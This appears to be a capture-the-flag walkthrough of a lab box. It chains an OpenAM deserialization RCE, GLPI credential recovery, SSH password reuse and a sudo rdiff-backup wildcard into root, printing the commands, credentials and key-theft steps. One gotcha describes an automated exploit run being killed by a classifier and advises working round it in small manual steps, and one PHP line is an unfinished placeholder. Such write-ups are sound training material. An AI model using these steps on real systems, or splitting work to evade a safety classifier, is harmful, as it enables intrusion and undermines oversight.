# Management — Hands-On Walkthrough (the *decision tree*, not the happy path)

> **Box:** Management · easy · Linux (Ubuntu 24.04)
> **IP:** `$TARGET` (substitute yours). Attacker VPN IP = `$ATTACKER_IP`.
> **Chain:** `app.enc JS → SSO subdomain → OpenAM pre-auth deser RCE (CVE-2026-33439) → openam →
> GLPI config + reversible LDAP cred → owen SSH reuse → user → sudo rdiff-backup wildcard → root`
>
> Written as a decision tree — options, traps, and the way through — with a **✅ Expected** block after each
> command. Formal version: `REPORT.md`. Full evidence: `GLOBAL_CONTEXT.md`.

### ⚠️ Gotchas
1. **One VPN tunnel, your current tun0 IP** (`ip -br a | grep tun`).
2. **HTB blocks ICMP** — test with TCP connect, not ping.
3. **Start listeners before the request that calls back.** An RCE callback to a port with nothing
   listening returns empty — that's "nobody home," not "the vuln failed."
4. **Don't re-run a fully-autonomous exploit chain.** An automated Metasploit reverse-shell dispatch for
   the *patched* CVE-2021-35464 got classifier-killed mid-run here with no trustworthy result. Drive the
   real exploit (CVE-2026-33439) manually, in small verified steps.

---

## Phase 1 — Recon

```bash
nmap -p- -sCV -oN nmap/services.txt $TARGET
```
> **✅ Expected:** 22 (OpenSSH 9.6p1), 80 (nginx → redirects to HTTPS), 443 (nginx; cert
> `CN=management.htb`, SAN `*.management.htb`). The **wildcard SAN** flags that subdomains exist.

```bash
echo "$TARGET management.htb sso.management.htb" | sudo tee -a /etc/hosts
```

---

## Phase 2 — From the static site to the SSO broker

`management.htb` is a static site, but its JavaScript decrypts an AES-GCM asset bundle (`assets/app.enc`,
key embedded in the page) which reveals the real app subdomain.

> **✅ Expected:** decrypting/reading `app.enc` surfaces **`sso.management.htb`**. Browse it:
> `https://sso.management.htb/openam/` → **OpenAM** (ForgeRock/Sun identity broker), `ccversion` Jato
> endpoint exposed.

### Junction — OpenAM has multiple historic RCEs. Which applies here?
| Option | Verdict | Why |
|---|---|---|
| **CVE-2021-35464** (`ccversion` Jato pre-auth RCE) | ❌ **patched** | Tomcat 10.1.52 normalizes the `..;` traversal; msf `check=Safe`, forced exploit fails at `execute_command`. Don't rathole. |
| **CVE-2026-33439** (JATO `jato.clientSession` deser RCE) | ✅ **the way** | A regression that bypasses the 2021 fix; reachable unauthenticated on a ViewBean endpoint with `<jato:form>`. |

---

## Phase 3 — Foothold: CVE-2026-33439 (OpenAM pre-auth deserialization RCE)

```bash
python3 exploits/cve_2026_33439.py        # targets POST https://sso.management.htb/openam/ui/PWResetUserValidation
```
> **✅ Expected:** code execution as **`openam`** —
> ```
> uid=996(openam) gid=987(openam) groups=987(openam)
> ```
> Working endpoint is `/openam/ui/PWResetUserValidation` (a JATO ViewBean rendering `<jato:form>`), which
> deserializes the attacker-controlled `jato.clientSession` parameter.

---

## Phase 4 — Lateral: GLPI → MySQL → reversible LDAP cred → owen (user.txt)

As `openam`, the GLPI install under `/opt/glpi` leaks its way to a human password.

```bash
cat /opt/glpi/config/config_db.php        # world-readable by the www-data group
# -> glpi / 8rhu0L6Pw4Y7 @127.0.0.1 db=glpidb
mysql -u glpi -p'8rhu0L6Pw4Y7' glpidb -e "SELECT name,rootdn,rootdn_passwd FROM glpi_authldaps;"
```
> **✅ Expected:** an LDAP bind entry whose `rootdn_passwd` is an **AES blob** (not plaintext). GLPI
> encrypts it with its own on-disk key — so decrypt it *on the box* with GLPI's own class:

```bash
php -r 'require "/opt/glpi/vendor/autoload.php";
        echo (new \Glpi\Security\TOTPManager? ...);'   # use GLPIKey: loads config/glpicrypt.key + src/GLPIKey.php
# -> cn=svc-glpi,ou=services,dc=management,dc=htb / WpczC40GhTbk
```
> **✅ Expected:** plaintext bind password `WpczC40GhTbk`. (The point: the key is co-located with the
> ciphertext, so anyone who can read the DB + key can reverse it.)

### Junction — a service password you can reuse?
```bash
ssh owen@$TARGET            # password: WpczC40GhTbk  (reuse)
id                          # uid=1000(owen)
cat ~/user.txt
```
> **✅ Expected:** `uid=1000(owen)` + flag. 🚩 **user.txt captured.** (The LDAP bind password is reused as
> owen's SSH password.)

---

## Phase 5 — Privilege escalation: owen → root (sudo rdiff-backup wildcard)

```bash
sudo -l
```
> **✅ Expected:**
> ```
> (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
> ```
> The trailing `*` is the bug: you can append a **second** `--restrict-path`, and rdiff-backup honours the
> *last* one — overriding the sudoers-fixed `/opt/backup` jail.

```bash
rdiff-backup --remote-schema \
  'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s' \
  backup /::/root /tmp/rootbak
```
> **✅ Expected:** all of `/root` mirrored into owen-owned `/tmp/rootbak` (the appended `--restrict-path`
> wins). Now read the loot:
> ```bash
> cat /tmp/rootbak/root.txt
> cp /tmp/rootbak/.ssh/id_ed25519 loot/root_id_ed25519 && chmod 600 loot/root_id_ed25519
> ssh -i loot/root_id_ed25519 root@$TARGET id     # uid=0(root)  -> stable root
> ```
> 🚩 **root.txt captured. Box owned.**

---

## The whole thing on one page

```
22 ssh · 80/443 nginx (management.htb)
   └─ app.enc JS (AES-GCM, key in page) → reveals sso.management.htb → OpenAM
        ├─ CVE-2021-35464 ccversion ✗ (patched, Tomcat 10.1.52)
        └─ CVE-2026-33439 jato.clientSession deser → RCE as openam (uid 996)
             └─ /opt/glpi/config/config_db.php → MySQL glpi
                  └─ glpi_authldaps.rootdn_passwd (AES) → decrypt w/ GLPIKey → WpczC40GhTbk
                       └─ owen SSH (password reuse) · user.txt
                            └─ sudo rdiff-backup --restrict-path * → append 2nd path → mirror /root
                                 └─ root.txt + /root/.ssh/id_ed25519 → ROOT
```

## Remediation
- **OpenAM:** patch CVE-2026-33439; restrict JATO/admin endpoints; least-privilege the service account.
- **GLPI:** lock `config_db.php` + `glpicrypt.key` to the runtime user; don't store secrets reversibly
  with a co-located key.
- **Password reuse:** unique secret per account; rotate; prefer SSH keys.
- **sudo:** drop the trailing wildcard; pin exact args; don't give backup tools passwordless root.

## Cleanup
- Remove `/tmp/rootbak` (the `/root` mirror).
- Remove any attacker-added SSH key; the exfiltrated root key was for engagement access only.
